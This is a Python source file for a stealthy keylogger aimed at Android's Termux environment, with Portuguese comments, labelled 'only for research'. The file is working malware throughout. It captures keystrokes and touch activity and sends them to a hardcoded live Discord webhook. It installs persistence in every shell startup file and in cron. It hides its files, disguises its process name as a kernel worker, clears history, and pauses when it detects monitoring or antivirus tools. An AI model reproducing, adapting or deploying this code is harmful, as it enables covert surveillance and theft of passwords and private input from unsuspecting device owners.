#!/usr/bin/env python3
"""
KEYLOGGER PROFISSIONAL SILENCIOSO - APENAS PARA PESQUISA
SISTEMA COMPLETAMENTE OCULTO E RESPONSIVO
"""

import os
import sys
import time
import json
import threading
import subprocess
import shutil
import random
import hashlib
from datetime import datetime
import requests
from pathlib import Path

# ========== CONFIGURAÇÕES ==========
WEBHOOK_URL = "https://discord.com/api/webhooks/1425044577080836228/BpIwVskxVoWoqBAaFxYJI9gVj9s1JGGamhtdC-huBcUrWWufq2-bI1EcX_QAeLfkU7q2"
LOG_INTERVAL = 180
MAX_LOG_SIZE = 500

# Estrutura de pastas organizada
BASE_DIRS = {
    'root': Path("/data/data/com.termux/files/home/.cache_system"),
    'logs': Path("/data/data/com.termux/files/home/.cache_system/logs"),
    'config': Path("/data/data/com.termux/files/home/.cache_system/config"), 
    'backup': Path("/data/data/com.termux/files/home/.cache_system/backup")
}

# Persistência atualizada
TERMUX_PATHS = [
    "/data/data/com.termux/files/usr/etc/bash.bashrc",
    "/data/data/com.termux/files/usr/etc/zshrc", 
    "/data/data/com.termux/files/home/.bashrc",
    "/data/data/com.termux/files/home/.zshrc",
    "/data/data/com.termux/files/home/.config/fish/config.fish",
    "/data/data/com.termux/files/home/.profile",
    "/data/data/com.termux/files/home/.bash_profile"
]

class ProfessionalKeylogger:
    def __init__(self):
        self.log_data = []
        self.is_running = False
        self.session_id = self.generate_session_id()
        self.setup_directories()
        
    def generate_session_id(self):
        """Gera ID de sessão único"""
        return hashlib.md5(f"{datetime.now()}{random.random()}".encode()).hexdigest()[:10]
    
    def setup_directories(self):
        """Configura estrutura de pastas silenciosamente"""
        try:
            for dir_name, dir_path in BASE_DIRS.items():
                dir_path.mkdir(parents=True, exist_ok=True)
                os.system(f"chmod 700 {dir_path} 2>/dev/null")
                os.system(f"chattr +i {dir_path} 2>/dev/null")
            
            # Arquivos com nomes aleatórios
            random_suffix = random.randint(1000, 9999)
            self.keylog_file = BASE_DIRS['logs'] / f".klog_{random_suffix}.dat"
            self.syslog_file = BASE_DIRS['logs'] / f".sys_{random_suffix}.dat" 
            self.error_file = BASE_DIRS['logs'] / f".err_{random_suffix}.dat"
            
            # Backup do script com nome aleatório
            script_names = [".sys_daemon", ".bin_loader", ".term_optimizer"]
            self.script_backup = BASE_DIRS['backup'] / f"{random.choice(script_names)}.py"
            
            if os.path.exists(__file__):
                shutil.copy2(__file__, self.script_backup)
                os.system(f"chmod 755 {self.script_backup} 2>/dev/null")
                os.system(f"chattr +i {self.script_backup} 2>/dev/null")
                
            return True
            
        except Exception:
            return False

    def install_persistence(self):
        """Instala persistência silenciosa"""
        try:
            # Comandos de ativação camuflados
            activation_cmds = [
                f"\n# System optimization service\npython {self.script_backup} > /dev/null 2>&1 &\n",
                f"\n# Performance daemon\nnohup python {self.script_backup} &>/dev/null &\n",
                f"\n# Background process\n(python {self.script_backup} & disown) >/dev/null 2>&1\n"
            ]
            
            installed = False
            for termux_path in TERMUX_PATHS:
                try:
                    path = Path(termux_path)
                    if path.parent.exists():
                        cmd = random.choice(activation_cmds)
                        with open(path, 'a') as f:
                            f.write(cmd)
                        os.system(f"chmod 644 {path} 2>/dev/null")
                        installed = True
                except Exception:
                    continue
            
            # Persistência via cron
            self.install_cron_persistence()
            
            return installed
            
        except Exception:
            return False

    def install_cron_persistence(self):
        """Instala persistência cron"""
        try:
            cron_cmd = f"@reboot python {self.script_backup} > /dev/null 2>&1\n"
            cron_file = "/data/data/com.termux/files/usr/var/spool/cron/crontabs/$(whoami)"
            
            if os.path.exists(os.path.dirname(cron_file)):
                with open(cron_file, 'a') as f:
                    f.write(cron_cmd)
                os.system("pkill crond && crond 2>/dev/null")
        except Exception:
            pass

    def capture_real_input(self):
        """Captura input real do sistema"""
        try:
            # Thread principal para eventos Android
            def android_keyboard_monitor():
                while self.is_running:
                    try:
                        self.monitor_android_keys()
                    except Exception:
                        time.sleep(30)

            # Thread para eventos de toque
            def touch_monitor():
                while self.is_running:
                    try:
                        self.monitor_touch_events()
                    except Exception:
                        time.sleep(25)

            # Thread para informações do sistema
            def system_monitor():
                while self.is_running:
                    try:
                        self.capture_system_info()
                        time.sleep(60)
                    except Exception:
                        time.sleep(45)

            # Inicia threads
            threading.Thread(target=android_keyboard_monitor, daemon=True).start()
            threading.Thread(target=touch_monitor, daemon=True).start()
            threading.Thread(target=system_monitor, daemon=True).start()

        except Exception:
            pass

    def monitor_android_keys(self):
        """Monitora teclas Android via getevent"""
        try:
            process = subprocess.Popen(
                ['getevent', '-l', '-t', '/dev/input/event*'],
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                text=True,
                bufsize=1
            )
            
            key_buffer = ""
            
            for line in process.stdout:
                if not self.is_running:
                    process.terminate()
                    break
                    
                if 'KEY' in line and 'DOWN' in line:
                    key = self.parse_key_event(line)
                    if key:
                        key_buffer += key
                        
                        # Envia quando tiver sequência ou caractere especial
                        if len(key_buffer) >= 4 or key in ['\n', ' ', '\t', '[ENTER]']:
                            self.log_keystroke(key_buffer)
                            key_buffer = ""
                            
        except Exception:
            time.sleep(30)

    def parse_key_event(self, event_line):
        """Converte eventos para teclas reais"""
        key_mappings = {
            'KEY_A': 'a', 'KEY_B': 'b', 'KEY_C': 'c', 'KEY_D': 'd', 'KEY_E': 'e',
            'KEY_F': 'f', 'KEY_G': 'g', 'KEY_H': 'h', 'KEY_I': 'i', 'KEY_J': 'j',
            'KEY_K': 'k', 'KEY_L': 'l', 'KEY_M': 'm', 'KEY_N': 'n', 'KEY_O': 'o',
            'KEY_P': 'p', 'KEY_Q': 'q', 'KEY_R': 'r', 'KEY_S': 's', 'KEY_T': 't',
            'KEY_U': 'u', 'KEY_V': 'v', 'KEY_W': 'w', 'KEY_X': 'x', 'KEY_Y': 'y',
            'KEY_Z': 'z',
            'KEY_0': '0', 'KEY_1': '1', 'KEY_2': '2', 'KEY_3': '3', 'KEY_4': '4',
            'KEY_5': '5', 'KEY_6': '6', 'KEY_7': '7', 'KEY_8': '8', 'KEY_9': '9',
            'KEY_SPACE': ' ', 'KEY_ENTER': '\n', 'KEY_BACKSPACE': '[BS]',
            'KEY_DELETE': '[DEL]', 'KEY_TAB': '\t', 'KEY_ESC': '[ESC]',
            'KEY_LEFT': '[LEFT]', 'KEY_RIGHT': '[RIGHT]', 'KEY_UP': '[UP]', 'KEY_DOWN': '[DOWN]',
            'KEY_COMMA': ',', 'KEY_DOT': '.', 'KEY_SLASH': '/', 'KEY_SEMICOLON': ';',
            'KEY_APOSTROPHE': "'", 'KEY_GRAVE': '`', 'KEY_LEFTBRACE': '[', 'KEY_RIGHTBRACE': ']',
            'KEY_BACKSLASH': '\\', 'KEY_MINUS': '-', 'KEY_EQUAL': '=',
            'KEY_F1': '[F1]', 'KEY_F2': '[F2]', 'KEY_F3': '[F3]', 'KEY_F4': '[F4]'
        }
        
        for code, key in key_mappings.items():
            if code in event_line:
                return key
        return None

    def monitor_touch_events(self):
        """Monitora eventos de toque"""
        try:
            process = subprocess.Popen(
                ['getevent', '-l', '-t', '/dev/input/event*'],
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                text=True,
                bufsize=1
            )
            
            touch_count = 0
            last_touch_time = time.time()
            
            for line in process.stdout:
                if not self.is_running:
                    process.terminate()
                    break
                    
                if 'ABS_MT_POSITION' in line or 'BTN_TOUCH' in line:
                    touch_count += 1
                    current_time = time.time()
                    
                    # Loga atividade de toque a cada 10 eventos ou 30 segundos
                    if touch_count >= 10 or (current_time - last_touch_time) >= 30:
                        self.log_system_activity(f"Touch events: {touch_count}")
                        touch_count = 0
                        last_touch_time = current_time
                        
        except Exception:
            time.sleep(25)

    def capture_system_info(self):
        """Captura informações do sistema úteis"""
        try:
            timestamp = datetime.now().isoformat()
            
            # Informações básicas do sistema
            system_data = {
                'timestamp': timestamp,
                'type': 'system_info',
                'session': self.session_id,
                'current_dir': os.getcwd(),
                'user': os.getenv('USER', 'unknown'),
                'uptime': self.get_system_uptime(),
                'memory_usage': self.get_memory_usage(),
                'storage_free': self.get_storage_info()
            }
            
            self.add_to_buffer(system_data)
            self.save_local_log(system_data, 'system')
            
        except Exception:
            pass

    def get_system_uptime(self):
        """Obtém uptime do sistema"""
        try:
            with open('/proc/uptime', 'r') as f:
                uptime_seconds = float(f.readline().split()[0])
                hours = int(uptime_seconds // 3600)
                minutes = int((uptime_seconds % 3600) // 60)
                return f"{hours}h {minutes}m"
        except:
            return "unknown"

    def get_memory_usage(self):
        """Obtém uso de memória"""
        try:
            with open('/proc/meminfo', 'r') as f:
                lines = f.readlines()
                total = int(lines[0].split()[1])
                free = int(lines[1].split()[1])
                used = total - free
                usage_percent = (used / total) * 100
                return f"{usage_percent:.1f}%"
        except:
            return "unknown"

    def get_storage_info(self):
        """Obtém espaço livre em disco"""
        try:
            result = subprocess.run(['df', '/data'], capture_output=True, text=True)
            lines = result.stdout.split('\n')
            if len(lines) > 1:
                free_space = lines[1].split()[3]
                return free_space
        except:
            return "unknown"

    def log_keystroke(self, keystroke):
        """Registro de teclas capturadas"""
        try:
            timestamp = datetime.now().isoformat()
            
            key_data = {
                'timestamp': timestamp,
                'type': 'keystroke',
                'session': self.session_id,
                'keystroke': keystroke,
                'application': 'terminal',
                'device': 'android_keyboard'
            }
            
            self.add_to_buffer(key_data)
            self.save_local_log(key_data, 'keystroke')
            
        except Exception:
            pass

    def log_system_activity(self, activity):
        """Registro de atividade do sistema"""
        try:
            timestamp = datetime.now().isoformat()
            
            activity_data = {
                'timestamp': timestamp,
                'type': 'activity',
                'session': self.session_id,
                'activity': activity
            }
            
            self.add_to_buffer(activity_data)
            self.save_local_log(activity_data, 'activity')
            
        except Exception:
            pass

    def add_to_buffer(self, data):
        """Adiciona dados ao buffer de envio"""
        self.log_data.append(data)
        
        # Envia quando tiver dados suficientes
        if len(self.log_data) >= 12:
            self.send_data_safely()

    def save_local_log(self, data, log_type):
        """Salva log local organizado"""
        try:
            if log_type == 'keystroke':
                log_file = self.keylog_file
            else:
                log_file = self.syslog_file
                
            with open(log_file, 'a', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False)
                f.write('\n')
                
        except Exception:
            pass

    def send_data_safely(self):
        """Envio seguro de dados"""
        if not self.log_data:
            return
            
        try:
            data_to_send = self.log_data.copy()
            self.log_data = []
            
            threading.Thread(target=self.send_to_webhook, args=(data_to_send,), daemon=True).start()
            
        except Exception:
            self.log_data.extend(data_to_send)

    def send_to_webhook(self, data):
        """Envia dados para webhook"""
        max_retries = 2
        
        for attempt in range(max_retries):
            try:
                if not data:
                    return
                    
                chunks = self.create_data_chunks(data)
                
                for chunk in chunks:
                    if self.send_data_chunk(chunk):
                        time.sleep(1.5)
                    else:
                        time.sleep(5)
                
                break
                
            except Exception:
                if attempt < max_retries - 1:
                    time.sleep(20)
                else:
                    self.log_data.extend(data)

    def create_data_chunks(self, data):
        """Cria chunks organizados de dados"""
        chunks = []
        
        # Separa teclas de informações de sistema
        keystrokes = [d for d in data if d.get('type') == 'keystroke']
        system_info = [d for d in data if d.get('type') in ['system_info', 'activity']]
        
        # Chunks de teclas (8 por mensagem)
        for i in range(0, len(keystrokes), 8):
            chunk = keystrokes[i:i+8]
            formatted_keys = "".join([item.get('keystroke', '') for item in chunk])
            
            chunks.append({
                'type': 'keystrokes',
                'data': chunk,
                'formatted': formatted_keys,
                'count': len(chunk)
            })
        
        # Chunks de sistema (6 por mensagem)
        for i in range(0, len(system_info), 6):
            chunk = system_info[i:i+6]
            formatted_system = "\n".join([
                f"{item.get('timestamp', '')} - {item.get('activity', item.get('type', ''))}"
                for item in chunk
            ])
            
            chunks.append({
                'type': 'system',
                'data': chunk,
                'formatted': formatted_system,
                'count': len(chunk)
            })
            
        return chunks

    def send_data_chunk(self, chunk):
        """Envia um chunk de dados"""
        try:
            if chunk['type'] == 'keystrokes':
                title = "⌨️ Keystrokes Captured"
                color = 0x00ff00
                description = f"**{chunk['count']} keystrokes recorded**"
                content = f"```\n{chunk['formatted']}```"
            else:
                title = "📊 System Information"
                color = 0xffa500
                description = f"**{chunk['count']} system events**"
                content = f"```\n{chunk['formatted']}```"
            
            payload = {
                "embeds": [{
                    "title": title,
                    "color": color,
                    "description": description,
                    "fields": [
                        {
                            "name": "Session ID",
                            "value": f"`{self.session_id}`",
                            "inline": True
                        },
                        {
                            "name": "Timestamp",
                            "value": f"`{datetime.now().strftime('%H:%M:%S')}`",
                            "inline": True
                        }
                    ],
                    "timestamp": datetime.now().isoformat()
                }]
            }
            
            # Adiciona conteúdo se não estiver vazio
            if chunk['formatted'].strip():
                payload["embeds"][0]["fields"].append({
                    "name": "Content",
                    "value": content,
                    "inline": False
                })
            
            response = requests.post(
                WEBHOOK_URL,
                json=payload,
                timeout=15,
                headers={
                    'User-Agent': 'Mozilla/5.0 (X11; Linux arm64) AppleWebKit/537.36',
                    'Content-Type': 'application/json'
                }
            )
            
            return response.status_code in [200, 204]
            
        except Exception:
            return False

    def enable_stealth(self):
        """Ativa modo stealth completo"""
        try:
            # Limpeza silenciosa
            os.system('clear 2>/dev/null')
            os.system('history -c 2>/dev/null')
            
            # Baixa prioridade
            if hasattr(os, 'nice'):
                os.nice(19)
                
            # Nome de processo falso
            try:
                import prctl
                prctl.set_name("[kworker/u9:0]")
            except:
                pass
                
        except Exception:
            pass

    def security_monitoring(self):
        """Monitoramento de segurança"""
        def security_loop():
            while self.is_running:
                try:
                    # Verifica processos de monitoramento
                    result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=10)
                    
                    monitoring_tools = [
                        'wireshark', 'tcpdump', 'avast', 'kaspersky', 'malwarebytes',
                        'netstat', 'lsof', 'strace', 'auditd', 'rkhunter'
                    ]
                    
                    for tool in monitoring_tools:
                        if tool in result.stdout.lower():
                            self.activate_evasion()
                            break
                            
                    time.sleep(60)
                    
                except Exception:
                    time.sleep(90)
        
        threading.Thread(target=security_loop, daemon=True).start()

    def activate_evasion(self):
        """Ativa modo de evasão"""
        try:
            self.is_running = False
            time.sleep(150)  # Espera 2.5 minutos
            
            # Limpeza temporária
            if hasattr(self, 'keylog_file') and self.keylog_file.exists():
                self.keylog_file.unlink()
                
            # Reinício stealth
            self.is_running = True
            self.enable_stealth()
            
        except Exception:
            pass

    def start_silent_mode(self):
        """Inicia modo completamente silencioso"""
        # Setup inicial
        if not self.setup_directories():
            return False
            
        # Persistência
        self.install_persistence()
        
        # Stealth
        self.enable_stealth()
        
        # Segurança
        self.security_monitoring()
        
        self.is_running = True
        
        # Captura
        self.capture_real_input()
        
        # Auto-envio
        def auto_send_loop():
            while self.is_running:
                try:
                    if self.log_data:
                        self.send_data_safely()
                    time.sleep(LOG_INTERVAL)
                except Exception:
                    time.sleep(90)
        
        threading.Thread(target=auto_send_loop, daemon=True).start()
        
        return True

    def stop(self):
        """Para o sistema"""
        self.is_running = False
        if self.log_data:
            self.send_data_safely()

# Inicialização completamente silenciosa
if __name__ == "__main__":
    # Verificação silenciosa do ambiente
    is_termux = any([
        'termux' in str(Path.home()).lower(),
        'com.termux' in os.getenv('PREFIX', ''),
        os.path.exists('/data/data/com.termux')
    ])
    
    if not is_termux:
        sys.exit(0)  # Sai silenciosamente
    
    keylogger = ProfessionalKeylogger()
    
    try:
        if keylogger.start_silent_mode():
            # Loop principal completamente silencioso
            while True:
                time.sleep(300)
        else:
            sys.exit(0)
            
    except KeyboardInterrupt:
        keylogger.stop()
    except Exception:
        keylogger.stop()
